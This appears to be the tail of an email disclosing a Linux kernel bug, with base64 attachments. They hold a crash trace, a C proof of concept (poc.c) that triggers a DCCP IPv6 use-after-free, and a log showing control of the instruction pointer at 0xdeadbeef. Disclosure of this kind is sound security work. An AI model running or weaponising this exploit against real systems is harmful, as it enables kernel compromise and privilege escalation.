X2hjX3J4X2RlbGV0ZSsweGJmLzB4MTAwClsgICA4NC45NzMyNDddICBkY2Nw
X2Rlc3Ryb3lfc29jaysweDFhNy8weDJiMApbICAgODQuOTczNTk2XSAgZGNj
cF92Nl9kZXN0cm95X3NvY2srMHgxNS8weDIwClsgICA4NC45NzM5NDZdICBp
bmV0X2Nza19kZXN0cm95X3NvY2srMHgxNjYvMHg0MDAKWyAgIDg0Ljk3NDMx
OV0gIGRjY3BfY2xvc2UrMHgzZGUvMHhjNDAKWyAgIDg0Ljk3NDYyN10gID8g
X19mc25vdGlmeV91cGRhdGVfY2hpbGRfZGVudHJ5X2ZsYWdzLnBhcnQuMisw
eDJjMC8weDJjMApbICAgODQuOTc1MTY4XSAgPyBpcF9tY19kcm9wX3NvY2tl
dCsweDFkZC8weDI1MApbICAgODQuOTc1NTI2XSAgPyBzb2NrX3JlbGVhc2Ur
MHgyMDAvMHgyMDAKWyAgIDg0Ljk3NTg0NF0gIGluZXRfcmVsZWFzZSsweGVk
LzB4MWMwClsgICA4NC45NzYxNDRdICBpbmV0Nl9yZWxlYXNlKzB4NTAvMHg3
MApbICAgODQuOTc2NDQ2XSAgc29ja19yZWxlYXNlKzB4OGQvMHgyMDAKWyAg
IDg0Ljk3Njc0N10gIHNvY2tfY2xvc2UrMHgxNi8weDIwClsgICA4NC45Nzcw
MjFdICBfX2ZwdXQrMHgyODkvMHg2ZjAKWyAgIDg0Ljk3NzI4NV0gIF9fX19m
cHV0KzB4MTUvMHgyMApbICAgODQuOTc3NTUzXSAgdGFza193b3JrX3J1bisw
eGY5LzB4MTcwClsgICA4NC45Nzc4NjFdICBleGl0X3RvX3VzZXJtb2RlX2xv
b3ArMHgxM2IvMHgxNjAKWyAgIDg0Ljk3ODIzNV0gIHN5c2NhbGxfcmV0dXJu
X3Nsb3dwYXRoKzB4MTZiLzB4MWEwClsgICA4NC45Nzg2MTldICBlbnRyeV9T
WVNDQUxMXzY0X2Zhc3RwYXRoKzB4YWYvMHhiMQpbICAgODQuOTc5MDA3XSBS
SVA6IDAwMzM6MHg0M2ZhODAKWyAgIDg0Ljk3OTI2NF0gUlNQOiAwMDJiOjAw
MDA3ZmZkMzU4MTgwYzggRUZMQUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAw
MDAwMDAwMDAwMDAwMwpbICAgODQuOTc5ODgwXSBSQVg6IDAwMDAwMDAwMDAw
MDAwMDAgUkJYOiAwMDAwMDAwMDAwNDAwMmM4IFJDWDogMDAwMDAwMDAwMDQz
ZmE4MApbICAgODQuOTgwNDY4XSBSRFg6IDAwMDAwMDAwMDA2Y2Q1ZDAgUlNJ
OiAwMDAwMDAwMDAwMDAwMDBhIFJESTogMDAwMDAwMDAwMDAwMDAwNApbICAg
ODQuOTgxMDQxXSBSQlA6IDAwMDA3ZmZkMzU4MTg2YzAgUjA4OiAwMDAwMDAw
MDAwNmNkNWMwIFIwOTogMDAwMDAwMDAwMGIzYzg4MApbICAgODQuOTgxNjEz
XSBSMTA6IDAwMDAwMDAwMDAwMDAwMDYgUjExOiAwMDAwMDAwMDAwMDAwMjQ2
IFIxMjogMDAwMDAwMDAwMDQwMThiMApbICAgODQuOTgyMTg3XSBSMTM6IDAw
MDAwMDAwMDA0MDE5NDAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIxNTogMDAw
MDAwMDAwMDAwMDAwMApbICAgODQuOTgyNzY4XSBDb2RlOiBjMCAwZiA4NSA3
NCBmZiBmZiBmZiAwZiBmZiBlOSA2ZCBmZiBmZiBmZiAwZiAxZiAwMCA2NiAy
ZSAwZiAxZiA4NCAwMCAwMCAwMCAwMCAwMCA1NSA0OCA4OSBlNSA0MSA1NyA0
MSA1NiA0MSA1NSA0MSA1NCA0OSA4OSBmYyA1MyA8ZjY+IDQ3IDA5IDAxIDBm
IDg1IGM0IDAxIDAwIDAwIDRkIDg1IGU0IDBmIDg0IDAyIDAxIDAwIDAwIGJh
IDAwClsgICA4NC45ODQzMzVdIFJJUDoga21lbV9jYWNoZV9mcmVlKzB4MTAv
MHgyYjAgUlNQOiBmZmZmODgwMDMxYTRmYzQwClsgICA4NC45ODQ4MjVdIENS
MjogMDAwMDAwMDAwMDAwMDAwOQpbICAgODQuOTg1MTAyXSAtLS1bIGVuZCB0
cmFjZSAzMWU2OGM4MWY0OTVlMTc0IF0tLS0KWyAgIDg0Ljk4NTQ3N10gS2Vy
bmVsIHBhbmljIC0gbm90IHN5bmNpbmc6IEZhdGFsIGV4Y2VwdGlvbiBpbiBp
bnRlcnJ1cHQKWyAgIDg0Ljk4NjIzMF0gS2VybmVsIE9mZnNldDogMHg4MDAw
MDAwIGZyb20gMHhmZmZmZmZmZjgxMDAwMDAwIChyZWxvY2F0aW9uIHJhbmdl
OiAweGZmZmZmZmZmODAwMDAwMDAtMHhmZmZmZmZmZmJmZmZmZmYK

--f403043b2478f365ad055f8cadf0
Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jasv7iux1

LypUaGlzIHBvYyBoYXMgYmVlbiB0ZXN0ZWQgb24gbXkgY3VzdG9tIGtlcm5l
bCByZXNlYWNoIGluIHVidW50dSA0LjEwLjUsIHRoZSBzYW1lIHRoaW5nIGFw
cGxpZXMgdG8gb3RoZXIgdmVyc2lvbnMKICogaWYgeW91IGRvbid0IHNlZSBS
SVAgY29udHJvbCwgdGhhdCBtZWFucyBmaWxlX3NlY3VyaXR5X2FsbG9jIGlz
IG5vdCBjYWxsZWQsIHNvIHdlIHNob3VsZCBsb29rIGZvciBvdGhlciBzaW1p
bGFyIG9iamVjdAogKiAqLwojZGVmaW5lIF9HTlVfU09VUkNFCiNpbmNsdWRl
IDxzdGRpby5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxzdGRs
aWIuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3Nv
Y2tldC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPG5l
dGluZXQvaW4uaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8cHRo
cmVhZC5oPgojaW5jbHVkZSA8c3lzL21tYW4uaD4KCgppbnQgZmQxLGZkMjsK
c3RydWN0IHNvY2thZGRyX2luNiBpbjEsaW4yOwoKaW50IGRvX3VhZigpCnsK
ICAgIHN0cnVjdCBzb2NrYWRkcl9pbjYgY2luMSxjaW4yOwoKICAgIGZkMSA9
IHNvY2tldCgweGEsNiwwKTsKCiAgICBtZW1zZXQoJmluMSwwLHNpemVvZihp
bjEpKTsKICAgIGluMS5zaW42X2ZhbWlseSA9IEFGX0lORVQ2OwogICAgaW4x
LnNpbjZfYWRkciA9IGluNmFkZHJfbG9vcGJhY2s7CiAgICBpbjEuc2luNl9w
b3J0ID0gMHgyMTRlOy8vaHRvbnMoMHgxMDAwKTsKICAgIGJpbmQoZmQxLChz
dHJ1Y3Qgc29ja2FkZHIqKSZpbjEsc2l6ZW9mKGluMSkpOwoKICAgIGxpc3Rl
bihmZDEsMHgxKTsKCiAgICBmZDIgPSBzb2NrZXQoMHhhLDYsMCk7CgogICAg
bWVtc2V0KCZjaW4xLDAsc2l6ZW9mKGNpbjEpKTsKICAgIGNpbjEuc2luNl9m
YW1pbHkgPSBBRl9JTkVUNjsKICAgIGNpbjEuc2luNl9hZGRyID0gaW42YWRk
cl9sb29wYmFjazsKICAgIGNpbjEuc2luNl9wb3J0ID0gMHgyMTRlOy8vaHRv
bnMoMHgxMDAwKTsKICAgIGNpbjEuc2luNl9mbG93aW5mbyA9IDA7CiAgICBj
b25uZWN0KGZkMiwoc3RydWN0IHNvY2thZGRyKikmY2luMSxzaXplb2YoY2lu
MSkpOwoKICAgIG1lbXNldCgmY2luMiwwLHNpemVvZihjaW4yKSk7CiAgICBj
b25uZWN0KGZkMSwoc3RydWN0IHNvY2thZGRyKikmY2luMixzaXplb2YoY2lu
MikpOwogICAgbWVtc2V0KCZpbjIsMCxzaXplb2YoaW4yKSk7CgogICAgaW4y
LnNpbjZfZmFtaWx5ID0gQUZfSU5FVDY7CiAgICBpbjIuc2luNl9hZGRyID0g
aW42YWRkcl9sb29wYmFjazsKICAgIGluMi5zaW42X3BvcnQgPSBodG9ucygw
eDIwMDApOwogICAgaW4yLnNpbjZfZmxvd2luZm8gPSAweDI7CiAgICBpbjIu
c2luNl9zY29wZV9pZCA9IDY7CiAgICBiaW5kKGZkMiwoc3RydWN0IHNvY2th
ZGRyKikmaW4yLHNpemVvZihpbjIpKTsKCiAgICBzdHJ1Y3Qgc29ja2FkZHJf
aW42IGNpbjM7CiAgICBtZW1zZXQoJmNpbjMsMCxzaXplb2YoY2luMykpOwog
ICAgY29ubmVjdChmZDIsKHN0cnVjdCBzb2NrYWRkciopJmNpbjMsc2l6ZW9m
KGNpbjMpKTsKCiAgICBsaXN0ZW4oZmQyLDB4YjEpOwoKICAgIHN0cnVjdCBz
b2NrYWRkcl9pbjYgY2luNDsKICAgIG1lbXNldCgmY2luNCwwLHNpemVvZihj
aW40KSk7CiAgICBjaW40LnNpbjZfZmFtaWx5ID0gQUZfSU5FVDY7CiAgICBj
aW40LnNpbjZfcG9ydCA9IGh0b25zKDB4MjAwMCk7Ly9odG9ucygweDMwMDAp
OwogICAgbWVtc2V0KCZjaW40LnNpbjZfYWRkciwwLHNpemVvZihzdHJ1Y3Qg
aW42X2FkZHIpKTsKICAgIGNpbjQuc2luNl9mbG93aW5mbyA9IDE7CiAgICBj
aW40LnNpbjZfc2NvcGVfaWQgPSAweDMyZjE7CiAgICBjb25uZWN0KGZkMSwo
c3RydWN0IHNvY2thZGRyKikmY2luNCxzaXplb2YoY2luNCkpOwogICAgcmV0
dXJuIGZkMjsKfQoKdm9pZCAqIGFsbG9jX3VtZW0odm9pZCAqYWRkcixzaXpl
X3Qgc2l6ZSkKewoKICAgIGFkZHIgPSBtbWFwKCh2b2lkKikweDEwMDAwMDAw
MCw0MDk2LFBST1RfUkVBRCB8IFBST1RfV1JJVEUgfCBQUk9UX0VYRUMsTUFQ
X1NIQVJFRHxNQVBfQU5PTllNT1VTLC0xLDApOwogICAgaWYoYWRkciA9PSAo
Y2hhciAqKS0xKSB7CiAgICAgICAgcGVycm9yKCJtbWFwIik7CiAgICAgICAg
cmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gYWRkcjsKfQppbnQgbWFp
bih2b2lkKQp7CiAgICBjaGFyICphZGRyOwoKICAgIGFkZHIgPSAoY2hhciAq
KWFsbG9jX3VtZW0oKHZvaWQqKTB4MTAwMDAwMDAwLDQwOTYpOwogICAgaWYo
YWRkciA9PSBOVUxMKQogICAgICAgIGV4aXQoMCk7CiAgICBtZW1zZXQoYWRk
ciwweGNjLDQwOTYpOwogICAgKih1bnNpZ25lZCBsb25nICopKGFkZHIgKyAw
eDc5KSA9IDB4ZGVhZGJlZWY7IC8qIFJJUCBjb250cm9sICovCgogICAgZG9f
dWFmKCk7CiAgICBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsKICAg
IGNsb3NlKGZkMik7CiAgICByZXR1cm4gMDsKfQo=

--f403043b2478f365ad055f8cadf0
Content-Type: application/octet-stream; name="rip.log"
Content-Disposition: attachment; filename="rip.log"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jasv7iv42

WyAgIDMzLjI1NjEwNV0gQlVHOiB1bmFibGUgdG8gaGFuZGxlIGtlcm5lbCBw
YWdpbmcgcmVxdWVzdCBhdCAwMDAwMDAwMGRlYWRiZWVmClsgICAzMy4yNTcw
MzhdIElQOiAweGRlYWRiZWVmClsgICAzMy4yNTcwMzhdIFBHRCAzZDViYTA2
NwpbICAgMzMuMjU3MDM4XSBQVUQgMApbICAgMzMuMjU3MDM4XQpbICAgMzMu
MjU3MDM4XSBPb3BzOiAwMDEwIFsjMV0gU01QClsgICAzMy4yNTcwMzhdIE1v
ZHVsZXMgbGlua2VkIGluOgpbICAgMzMuMjU3MDM4XSBDUFU6IDAgUElEOiAy
NTIyIENvbW06IGRjY3AgTm90IHRhaW50ZWQgNC4xMC41ICMxClsgICAzMy4y
NTcwMzhdIEhhcmR3YXJlIG5hbWU6IFFFTVUgU3RhbmRhcmQgUEMgKGk0NDBG
WCArIFBJSVgsIDE5OTYpLCBCSU9TIFVidW50dS0xLjguMi0xdWJ1bnR1MSAw
NC8wMS8yMDE0ClsgICAzMy4yNTcwMzhdIHRhc2s6IGZmZmY4ODAwM2Q2MWFm
MDAgdGFzay5zdGFjazogZmZmZmM5MDAwMWNlYzAwMApbICAgMzMuMjU3MDM4
XSBSSVA6IDAwMTA6MHhkZWFkYmVlZgpbICAgMzMuMjU3MDM4XSBSU1A6IDAw
MTg6ZmZmZmM5MDAwMWNlZmQ2OCBFRkxBR1M6IDAwMDEwMjAyClsgICAzMy4y
NTcwMzhdIFJBWDogMDAwMDAwMDEwMDAwMDAwMSBSQlg6IGZmZmY4ODAwM2Q2
NTEyNzAgUkNYOiAwMDAwMDAwMDAwMDAwMDA3ClsgICAzMy4yNTcwMzhdIFJE
WDogMDAwMDAwMDBkZWFkYmVlZiBSU0k6IGZmZmY4ODAwM2Q3MTBlODAgUkRJ
OiBmZmZmODgwMDNkNzEwZTgwClsgICAzMy4yNTcwMzhdIFJCUDogZmZmZmM5
MDAwMWNlZmQ3OCBSMDg6IDAwMDAwMDAwMDAwMWZkZDAgUjA5OiBmZmZmZmZm
ZjgxODZmMGQxClsgICAzMy4yNTcwMzhdIFIxMDogZmZmZjg4MDAzZDg5MjIw
MCBSMTE6IDAwMDAwMDAwMDAwMDAwMDEgUjEyOiBmZmZmODgwMDNkNzExMGEw
ClsgICAzMy4yNTcwMzhdIFIxMzogMDAwMDAwMDAwMDAwMDAwNyBSMTQ6IGZm
ZmY4ODAwM2UyMjdhYTAgUjE1OiBmZmZmODgwMDNkMTkxMGMwClsgICAzMy4y
NTcwMzhdIEZTOiAgMDAwMDAwMDAwMWRlOTg4MCgwMDAwKSBHUzpmZmZmODgw
MDNmYzAwMDAwKDAwMDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDAKWyAgIDMz
LjI1NzAzOF0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAw
MDAwMDA4MDA1MDAzMwpbICAgMzMuMjU3MDM4XSBDUjI6IDAwMDAwMDAwZGVh
ZGJlZWYgQ1IzOiAwMDAwMDAwMDNjYWFkMDAwIENSNDogMDAwMDAwMDAwMDAw
MDZmMApbICAgMzMuMjU3MDM4XSBEUjA6IDAwMDAwMDAwMDAwMDAwMDAgRFIx
OiAwMDAwMDAwMDAwMDAwMDAwIERSMjogMDAwMDAwMDAwMDAwMDAwMApbICAg
MzMuMjU3MDM4XSBEUjM6IDAwMDAwMDAwMDAwMDAwMDAgRFI2OiAwMDAwMDAw
MGZmZmUwZmYwIERSNzogMDAwMDAwMDAwMDAwMDQwMApbICAgMzMuMjU3MDM4
XSBDYWxsIFRyYWNlOgpbICAgMzMuMjU3MDM4XSAgPyBjY2lkX2hjX3J4X2Rl
bGV0ZSsweDFlLzB4NDAKWyAgIDMzLjI1NzAzOF0gIGRjY3BfZGVzdHJveV9z
b2NrKzB4NzgvMHhiMApbICAgMzMuMjU3MDM4XSAgZGNjcF92Nl9kZXN0cm95
X3NvY2srMHhkLzB4MjAKWyAgIDMzLjI1NzAzOF0gIGluZXRfY3NrX2Rlc3Ry
b3lfc29jaysweDQ2LzB4MTYwClsgICAzMy4yNTcwMzhdICBkY2NwX2Nsb3Nl
KzB4MTJmLzB4MzUwClsgICAzMy4yNTcwMzhdICBpbmV0X3JlbGVhc2UrMHgz
Ny8weDYwClsgICAzMy4yNTcwMzhdICBpbmV0Nl9yZWxlYXNlKzB4MmIvMHg0
MApbICAgMzMuMjU3MDM4XSAgc29ja19yZWxlYXNlKzB4MWEvMHg3MApbICAg
MzMuMjU3MDM4XSAgc29ja19jbG9zZSsweGQvMHgyMApbICAgMzMuMjU3MDM4
XSAgX19mcHV0KzB4ZGEvMHgxZTAKWyAgIDMzLjI1NzAzOF0gIF9fX19mcHV0
KzB4OS8weDEwClsgICAzMy4yNTcwMzhdICB0YXNrX3dvcmtfcnVuKzB4Nzkv
MHhhMApbICAgMzMuMjU3MDM4XSAgZXhpdF90b191c2VybW9kZV9sb29wKzB4
NmYvMHg4MApbICAgMzMuMjU3MDM4XSAgc3lzY2FsbF9yZXR1cm5fc2xvd3Bh
dGgrMHg1My8weDYwClsgICAzMy4yNTcwMzhdICBlbnRyeV9TWVNDQUxMXzY0
X2Zhc3RwYXRoKzB4OTIvMHg5NApbICAgMzMuMjU3MDM4XSBSSVA6IDAwMzM6
MHg0MDBlNDAKWyAgIDMzLjI1NzAzOF0gUlNQOiAwMDJiOjAwMDA3ZmZmYzE3
YjQyMDggRUZMQUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAw
MDAwMwpbICAgMzMuMjU3MDM4XSBSQVg6IDAwMDAwMDAwMDAwMDAwMDAgUkJY
OiAwMDAwMDAwMDAwNDAwMmM4IFJDWDogMDAwMDAwMDAwMDQwMGU0MApbICAg
MzMuMjU3MDM4XSBSRFg6IDAwMDAwMDAwMDAwMDAwMDAgUlNJOiAwMDAwMDAw
MDAwMDAwMDAxIFJESTogMDAwMDAwMDAwMDAwMDAwNApbICAgMzMuMjU3MDM4
XSBSQlA6IDAwMDA3ZmZmYzE3YjQyMjAgUjA4OiBmZmZmZmZmZmZmZmZmZmZm
IFIwOTogMDAwMDAwMDAwMDAwMDAwMApbICAgMzMuMjU3MDM4XSBSMTA6IDAw
MDAwMDAwMDAwMDAwMjEgUjExOiAwMDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAw
MDAwMDAwMDQwNjJhMApbICAgMzMuMjU3MDM4XSBSMTM6IDAwMDAwMDAwMDA0
MDYzMzAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIxNTogMDAwMDAwMDAwMDAw
MDAwMApbICAgMzMuMjU3MDM4XSBDb2RlOiAgQmFkIFJJUCB2YWx1ZS4KWyAg
IDMzLjI1NzAzOF0gUklQOiAweGRlYWRiZWVmIFJTUDogZmZmZmM5MDAwMWNl
ZmQ2OApbICAgMzMuMjU3MDM4XSBDUjI6IDAwMDAwMDAwZGVhZGJlZWYKWyAg
IDMzLjI1NzAzOF0gLS0tWyBlbmQgdHJhY2UgMzkyY2NlNWJkMTA1NWY0ZSBd
LS0tClsgICAzMy4yNTcwMzhdIEtlcm5lbCBwYW5pYyAtIG5vdCBzeW5jaW5n
OiBGYXRhbCBleGNlcHRpb24gaW4gaW50ZXJydXB0ClsgICAzMy4yNTcwMzhd
IEtlcm5lbCBPZmZzZXQ6IGRpc2FibGVkCgo=

--f403043b2478f365ad055f8cadf0--
